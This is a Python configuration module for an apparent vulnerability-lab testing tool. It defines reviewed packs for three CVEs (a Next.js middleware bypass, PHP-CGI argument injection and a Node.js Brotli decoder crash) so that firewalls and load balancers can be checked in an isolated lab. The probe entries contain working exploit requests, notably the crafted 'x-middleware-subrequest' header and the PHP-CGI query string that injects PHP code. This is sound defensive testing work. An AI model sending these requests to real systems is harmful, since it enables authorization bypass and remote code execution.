"""Reviewed managed-lab packs, versions and immutable image references.

Each entry in PACKS couples a reviewed vulnerable application with the
request that reproduces the vulnerability and the observations the evidence
classifier expects. Packs are data: landing a new pack means adding a reviewed
entry here plus the matching baseline gate, classifier and exploit steps, not generalized runner code.

Every ``application_image`` and ``runner_image`` must be pinned by digest;
``prepare`` refuses references without ``@sha256:``. A pack whose lab image
has not completed its build-and-review carries an explicit unreviewed tag and
``image_status`` so ``mockforge cve list`` states that plainly instead of
silently pulling an unpinned image.
"""

LABEL = "io.mockforge.cve.run"

PACKS = {
    "CVE-2025-29927": {
        "catalog": {
            "schema_version": 1,
            "pack_revision": 1,
            "cve": "CVE-2025-29927",
            "title": "Next.js middleware authorization bypass",
            "platform": "Linux, local Docker/Podman engine, amd64",
            "application_version": "Next.js 15.2.2 (Vulhub)",
            "application_image": "docker.io/vulhub/nextjs@sha256:f01608b225bcb7952f5e558c445b9bd76a3bfb385e11521d1a06ad4cbe08b4a8",
            "runner_version": "Nuclei 3.11.1",
            "runner_image": "docker.io/projectdiscovery/nuclei@sha256:582d5546902e67052097cb2d07296c642d50a1afc5e44623cb038845df9a32eb",
            "references": [
                "https://github.com/vulhub/vulhub/tree/master/next.js/CVE-2025-29927",
                "https://github.com/advisories/GHSA-f82v-jwr5-mffw",
            ],
            "coverage": "One reviewed authorization-bypass case and benign controls; not all variants",
            "origin_port": 18082,
            "listen_address_guidance": (
                "The recorder defaults to 127.0.0.1:18082, which only accepts local "
                "connections. Testing an LB/WAAP on another machine requires "
                "--listen-address <an isolated lab interface IP>; keep that interface "
                "restricted to the test network because the recorder forwards to the "
                "vulnerable application."
            ),
        },
        "probe": {
            "template_id": "mockforge-nextjs-29927-observation",
            "template_name": "MockForge Next.js controlled lab observation",
            "method": "GET",
            "path": "/?__mockforge_cve={token}",
            "headers": {
                "X-Mockforge-Cve": "{token}",
                "x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware",
            },
            "body": None,
            "signature_header": "x-middleware-subrequest",
            # Body marker proving the bypass reached the application.
            "marker": "Dashboard Content",
        },
        "app": {
            "port": "3000/tcp",
            "env": {"NODE_ENV": "production"},
            "readiness": {"path": "/login", "status": 200},
        },
        "controls": {
            "benign_path": "/login?__mockforge_cve={token}",
            "benign_status": 200,
            "ordinary_path": "/?__mockforge_cve={token}",
            "ordinary_status": 307,
        },
        "baseline_gate": "middleware-bypass",
        "classifier": "middleware-bypass",
    },
    "CVE-2024-4577": {
        "catalog": {
            "schema_version": 1,
            "pack_revision": 1,
            "cve": "CVE-2024-4577",
            "title": "PHP CGI argument injection via Windows best-fit codepage",
            "platform": "Linux amd64 host, local Docker/Podman engine, Wine-based Windows PHP lab image",
            "application_version": "PHP 8.3.7 cgi (Windows, vulnerable) under Wine; Apache httpd 2.4.70 CGI harness",
            # NOT a reviewed image yet: the tag is an explicit placeholder and
            # prepare/run refuse it until the digest below is replaced with the
            # reviewed lab-host build (see examples/cve-lab/cve-2024-4577-lab-image/).
            "application_image": "docker.io/mockforge/cve-lab-phpcgi-wine:pending-lab-host-review",
            "image_status": "pending-lab-host-review",
            "runner_version": "Nuclei 3.11.1",
            "runner_image": "docker.io/projectdiscovery/nuclei@sha256:582d5546902e67052097cb2d07296c642d50a1afc5e44623cb038845df9a32eb",
            "references": [
                "https://github.com/advisories/GHSA-vxpp-6299-mxw3",
                "https://www.php.net/releases/8.3/release-8.3.8.php",
            ],
            "coverage": "One reviewed CGI argument-injection case and benign controls; not all codepages or handlers",
            "origin_port": 18082,
            "listen_address_guidance": (
                "The recorder defaults to 127.0.0.1:18082, which only accepts local "
                "connections. Testing an LB/WAAP on another machine requires "
                "--listen-address <an isolated lab interface IP>; keep that interface "
                "restricted to the test network because the recorder forwards to the "
                "vulnerable application."
            ),
        },
        "probe": {
            "template_id": "mockforge-phpcgi-4577-observation",
            "template_name": "MockForge PHP-CGI controlled lab observation",
            "method": "POST",
            # The exploit query must stay the entire query string: php-cgi's
            # argv-style parsing splits on '+', so any additional query
            # parameter would glue onto or hide the injected switches. The run
            # token rides the X-Mockforge-Cve header only.
            "path": "/php-cgi/php-cgi.exe?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp%3A%2F%2Finput",
            "headers": {
                "X-Mockforge-Cve": "{token}",
                "Content-Type": "application/x-www-form-urlencoded",
            },
            "body": "<?php echo 'MOCKFORGE-CVE-2024-4577'; ?>",
            "signature_header": None,
            # Body marker proving the injected PHP executed on the origin.
            "marker": "MOCKFORGE-CVE-2024-4577",
        },
        "app": {
            "port": "8080/tcp",
            "env": {},
            # Benign direct CGI access (no injected switches) is rejected by
            # the harness configuration; the reviewed image pins this status.
            "readiness": {"path": "/php-cgi/php-cgi.exe", "status": 404},
        },
        "controls": {
            "benign_path": "/php-cgi/php-cgi.exe?__mockforge_cve={token}",
            "benign_status": 404,
            "ordinary_path": "/?__mockforge_cve={token}",
            "ordinary_status": 200,
        },
        "baseline_gate": "cgi-argument-injection",
        "classifier": "cgi-argument-injection",
    },
    "CVE-2026-111497": {
        "catalog": {
            "schema_version": 1,
            "pack_revision": 1,
            "cve": "CVE-2026-111497",
            "title": "Node.js Brotli decoder out-of-bounds write (Node2Shell)",
            "platform": "Linux, local Docker/Podman engine, amd64",
            "application_version": "Node.js 22.23.3 (official image) with the reviewed lab application",
            "application_image": "docker.io/library/node@sha256:69a5713e7f4997e96d579aafd78734810e0dac0dd5ee4621d72c27a2891a4088",
            "runner_version": "Nuclei 3.11.1",
            "runner_image": "docker.io/projectdiscovery/nuclei@sha256:582d5546902e67052097cb2d07296c642d50a1afc5e44623cb038845df9a32eb",
            "references": [
                "https://github.com/advisories/GHSA-9v8h-qqgm-4m35",
                "https://nodejs.org/en/blog/vulnerability/october-2026-security-releases",
            ],
            "coverage": "One reviewed decoder-crash case and benign controls; not remote code execution or every exposure surface",
            "origin_port": 18082,
            "listen_address_guidance": (
                "The recorder defaults to 127.0.0.1:18082, which only accepts local "
                "connections. Testing an LB/WAAP on another machine requires "
                "--listen-address <an isolated lab interface IP>; keep that interface "
                "restricted to the test network because the recorder forwards to the "
                "vulnerable application."
            ),
        },
        # The pinned runner observes a plain healthy request; the exploit
        # request itself rides the raw prior-knowledge HTTP/2 client, because
        # the pack's attack surface is HTTP/2 ("HTTP2Shell") and its expected
        # outcome is a crash, not an HTTP response a template can match.
        "probe": {
            "template_id": "mockforge-node-111497-observation",
            "template_name": "MockForge Node Brotli controlled lab observation",
            "method": "GET",
            "path": "/health?__mockforge_cve={token}",
            "headers": {
                "X-Mockforge-Cve": "{token}",
            },
            "body": None,
            "signature_header": None,
            # Body marker proving the application was healthy and observable.
            "marker": "mockforge-node2shell-lab",
        },
        "app": {
            "port": "3000/tcp",
            "env": {},
            "readiness": {"path": "/health", "status": 200},
            "workdir": "/app",
            "command": ["node", "/app/server.js"],
            "mounts": [{"host": "{output}/server.js", "container": "/app/server.js"}],
        },
        # The reviewed lab application, mounted read-only into the pinned
        # official image. It serves an HTTP endpoint that decompresses request
        # bodies with the bundled Brotli decoder - the exposure surface the
        # advisory names - plus static healthy routes for the controls. The
        # decoder bug is transport-independent; the exploit request rides
        # HTTP/2 as far as the LB/WAAP and the recorder, which forwards the
        # standard hop to this application over HTTP/1.1. The app masks
        # nothing: no restarts, no crash handling beyond reporting a clean
        # decode error on a patched runtime.
        "application_script": """'use strict';
// MockForge CVE-2026-111497 managed lab application (reviewed).
const http = require('node:http');
const zlib = require('node:zlib');

// The reviewed trigger is consumed in two phases (streaming write, then a
// short final input), matching how a streaming consumer feeds the decoder:
// trigger (23068690 bytes) + 3 trailing zero bytes.
const PHASE_ONE_BYTES = 23068693;

http.createServer((req, res) => {
  const chunks = [];
  req.on('data', (chunk) => chunks.push(chunk));
  req.on('end', () => {
    const body = Buffer.concat(chunks);
    if (req.method === 'POST' && req.url.startsWith('/decode')) {
      const decoder = zlib.createBrotliDecompress();
      decoder.on('error', (error) => {
        if (!res.headersSent) {
          res.writeHead(422, { 'content-type': 'text/plain' });
          res.end(`invalid brotli: ${error.code || error.message}\\n`);
        }
      });
      const second = body.length > PHASE_ONE_BYTES ? body.subarray(PHASE_ONE_BYTES) : Buffer.alloc(0);
      const first = body.length > PHASE_ONE_BYTES ? body.subarray(0, PHASE_ONE_BYTES) : body;
      decoder.on('data', () => {});
      decoder.write(first, () => {
        if (second.length) {
          decoder.end(second, () => {
            if (!res.headersSent) {
              res.writeHead(200, { 'content-type': 'text/plain' });
              res.end('decoded\\n');
            }
          });
        } else {
          decoder.end();
        }
      });
      return;
    }
    res.writeHead(200, { 'content-type': 'text/plain' });
    res.end('mockforge-node2shell-lab\\n');
  });
}).listen(3000, '0.0.0.0');
""",
        "controls": {
            "benign_path": "/health?__mockforge_cve={token}",
            "benign_status": 200,
            "ordinary_path": "/?__mockforge_cve={token}",
            "ordinary_status": 200,
        },
        "exploit": {
            "method": "POST",
            "path": "/decode?__mockforge_cve={token}",
            "headers": {
                "X-Mockforge-Cve": "{token}",
                "Content-Type": "application/brotli",
            },
            "max_forwarded_body": 48 * 1024 * 1024,
            "timeout": 60,
        },
        "baseline_gate": "decoder-crash",
        "classifier": "decoder-crash",
        "baseline_exploit": "http2-crash",
        "target_exploit": "http2-crash",
    },
}

# Legacy single-pack exports; existing callers and tests import these names.
CVE = "CVE-2025-29927"
CATALOG = PACKS[CVE]["catalog"]
SIGNATURE = PACKS[CVE]["probe"]["headers"]["x-middleware-subrequest"]
